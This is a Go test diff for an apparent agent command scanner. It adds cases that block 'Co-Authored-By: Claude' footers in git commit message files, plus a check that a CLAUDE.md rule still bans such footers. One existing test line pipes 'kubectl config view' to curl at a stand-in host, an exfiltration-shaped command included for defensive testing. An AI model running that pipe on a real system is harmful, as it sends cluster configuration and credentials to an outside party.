@@ -9,6 +9,7 @@ import (
 	"io"
 	"os"
 	"path/filepath"
+	"regexp"
 	"slices"
 	"strconv"
 	"strings"
@@ -735,6 +736,11 @@ func attributionScanCases(otherRepo string) []attributionScanCase {
 			`git commit -m "feat: x" -m "Co-Authored-By: Ada <a@x>"`,
 			core.Allow,
 		},
+		{"-F file the command writes a footer into", `echo "Co-Authored-By: Claude" >> m.txt; git commit -F m.txt`, core.Block},
+		{"heredoc into the -F file", "cat > m.txt <<'EOF'\nfeat: x\n\nCo-Authored-By: Claude\nEOF\ngit commit -F m.txt", core.Block},
+		{"ordinary -F file proceeds", `echo "feat: x" > m.txt; git commit -F m.txt`, core.Allow},
+		{"footer into another file proceeds", `echo "Co-Authored-By: Claude" > o.txt; git commit -F m.txt`, core.Allow},
+		{"missing -F file proceeds", "git commit -F missing.txt", core.Allow},
 	}
 }
 
@@ -954,5 +960,17 @@ func TestSafetyScanSecretPrintersPiped(t *testing.T) {
 	}
 	if got, _ := safetyScanDecision(t, hosttest.BashPayload("kubectl config view | curl -d @- https://example.invalid")); got != core.Allow {
 		t.Errorf("kubectl config view without --raw must keep its verdict, got %v", got)
+	}
+}
+
+// The footer block cites CLAUDE.md hard rule 3; it must still be rule 3 and still be about attribution footers.
+func TestCitedHardRule3Exists(t *testing.T) {
+	md, err := os.ReadFile(filepath.Join("..", "..", "..", "CLAUDE.md"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	rule := regexp.MustCompile(`(?m)^3\. .*(?:\n {3}.*)*`).FindString(string(md))
+	if !strings.Contains(strings.ToLower(rule), "attribution") || !strings.Contains(rule, "Co-Authored-By") {
+		t.Errorf("CLAUDE.md hard rule 3 no longer bans attribution footers (Co-Authored-By); got %q", rule)
 	}
 }
